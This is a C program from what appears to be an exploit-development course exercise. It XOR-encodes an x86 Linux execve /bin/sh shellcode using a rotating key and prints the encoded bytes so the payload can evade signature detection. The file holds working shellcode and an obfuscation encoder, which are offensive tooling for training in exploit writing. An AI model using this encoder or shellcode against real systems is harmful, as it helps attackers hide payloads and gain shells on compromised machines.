/*
	
	Custom xor and rotate encoder for execve shellcode - Linux Intel/x86
	Purpose: SecurityTube Linux Assembly Expert Course	

*/

#include<stdio.h>
#include<stdint.h>
#include<stdlib.h>

int main(int argc, char **argv)
{
	// execve shellcode
	uint8_t *shellcode = 
		"\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68"		// execve /bin/sh shellode
		"\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"; 	//
	
	uint8_t key = '\x6d';	// encoding key
	uint8_t *newshell;
	int i, length=0;

	// length of shellcode
	i=0;
	while (shellcode[i++] != '\0')
		length++;

	// allocate memory for the encoded shellcode
	newshell = (uint8_t *)malloc(sizeof(uint8_t)*length);

	// make the encoding
	// xor shellcode byte with key and then right rotate the key
	for (i=0; i < length; i++)
	{
		newshell[i] = shellcode[i] ^ key;	// xor shellcode byte with key
		key = ((key >> 1) | (key << 7));	// right rotate the key
	}

	printf("[+] Length of the encoded shellcode including key: %d bytes\n", length+1);
	printf("[+] Encoded shellcode and key:\n");

	// print the encoded shellcode
	printf("\t");
	for (i=0; i<length; i++)
	{
		printf("0x%02x", newshell[i]);
		if (i != length-1)
			printf(",");
	}

	// at the end of the encoded shellcode, place the encoding key
	printf(",0x%02x\n", key);

	return 0;

}
